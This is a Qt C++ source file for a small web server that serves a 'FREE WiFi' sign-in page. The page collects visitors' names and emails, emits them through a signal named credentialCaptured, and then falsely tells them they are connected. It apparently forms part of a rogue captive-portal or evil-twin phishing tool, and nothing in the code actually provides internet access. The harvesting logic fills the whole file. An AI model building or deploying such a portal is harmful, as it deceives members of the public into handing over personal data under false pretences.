#include "WifiPortalServer.h"

#include <QTcpSocket>
#include <QUrl>
#include <QUrlQuery>

WifiPortalServer::WifiPortalServer(quint16 port, QObject* parent)
    : QObject(parent), m_port(port)
{
    m_server = new QTcpServer(this);
    connect(m_server, &QTcpServer::newConnection, this, &WifiPortalServer::onNewConnection);
}

bool WifiPortalServer::start()
{
    return m_server->listen(QHostAddress::Any, m_port);
}

void WifiPortalServer::onNewConnection()
{
    while (m_server->hasPendingConnections()) {
        QTcpSocket* socket = m_server->nextPendingConnection();
        connect(socket, &QTcpSocket::readyRead, this, [this, socket]() {
            handleClient(socket);
        });
        connect(socket, &QTcpSocket::disconnected, socket, &QTcpSocket::deleteLater);
    }
}

void WifiPortalServer::handleClient(QTcpSocket* socket)
{
    const QByteArray request = socket->readAll();

    const int firstLineEnd = request.indexOf('\n');
    const QByteArray firstLine = request.left(firstLineEnd).trimmed();
    const bool isPost = firstLine.startsWith("POST");

    auto sendResponse = [socket](int code, const QByteArray& status, const QString& body) {
        const QByteArray bodyBytes = body.toUtf8();
        const QByteArray header =
            "HTTP/1.1 " + QByteArray::number(code) + " " + status + "\r\n"
            "Content-Type: text/html; charset=utf-8\r\n"
            "Content-Length: " + QByteArray::number(bodyBytes.size()) + "\r\n"
            "Connection: close\r\n"
            "\r\n";
        socket->write(header);
        socket->write(bodyBytes);
        socket->disconnectFromHost();
    };

    if (isPost) {
        const int bodyStart = request.indexOf("\r\n\r\n");
        QByteArray body = (bodyStart >= 0) ? request.mid(bodyStart + 4) : QByteArray();

        // Form-encoding: replace + with space before percent-decoding
        body.replace('+', ' ');
        QUrlQuery query(QString::fromUtf8(body));
        const QString name  = query.queryItemValue(QStringLiteral("name"),  QUrl::FullyDecoded).trimmed();
        const QString email = query.queryItemValue(QStringLiteral("email"), QUrl::FullyDecoded).trimmed();

        if (!name.isEmpty() && !email.isEmpty()) {
            emit credentialCaptured(name, email);
        }

        sendResponse(200, "OK", buildThankYouPage(name.isEmpty() ? QStringLiteral("there") : name));
    } else {
        sendResponse(200, "OK", buildPortalPage());
    }
}

QString WifiPortalServer::buildPortalPage()
{
    return QStringLiteral(R"(<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Free WiFi</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{background:#111;color:#eee;font-family:Arial,sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;padding:20px}
.card{background:#1a1a1a;border-radius:16px;padding:40px 30px;max-width:400px;width:100%;text-align:center;box-shadow:0 0 40px rgba(0,255,200,.15)}
.icon{font-size:52px;margin-bottom:12px}
h1{color:#00ffcc;font-size:28px;margin-bottom:8px}
.sub{color:#aaa;font-size:14px;margin-bottom:28px}
input{width:100%;padding:14px;margin-bottom:14px;border-radius:8px;border:1px solid #333;background:#222;color:#fff;font-size:16px}
button{width:100%;padding:16px;background:#00aaff;border:none;border-radius:8px;color:#fff;font-size:18px;font-weight:bold;cursor:pointer}
button:active{background:#0088cc}
.terms{color:#555;font-size:11px;margin-top:16px}
</style>
</head>
<body>
<div class="card">
  <div class="icon">&#x1F4F6;</div>
  <h1>FREE WiFi</h1>
  <p class="sub">Sign in to get unlimited free internet access</p>
  <form method="POST" action="/login">
    <input type="text" name="name" placeholder="Your name" required autocomplete="name">
    <input type="email" name="email" placeholder="Email address" required autocomplete="email">
    <button type="submit">Connect Now</button>
  </form>
  <p class="terms">By connecting you agree to our terms of service</p>
</div>
</body>
</html>)");
}

QString WifiPortalServer::buildThankYouPage(const QString& name)
{
    return QStringLiteral(R"(<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Connected!</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{background:#111;color:#eee;font-family:Arial,sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;padding:20px}
.card{background:#1a1a1a;border-radius:16px;padding:40px 30px;max-width:400px;width:100%;text-align:center}
.icon{font-size:60px;margin-bottom:16px}
h1{color:#00ff88;font-size:26px;margin-bottom:10px}
p{color:#aaa;font-size:16px}
</style>
</head>
<body>
<div class="card">
  <div class="icon">&#x2705;</div>
  <h1>You're connected, )") + name.toHtmlEscaped() + QStringLiteral(R"(!</h1>
  <p>Enjoy your free internet access.</p>
</div>
</body>
</html>)");
}
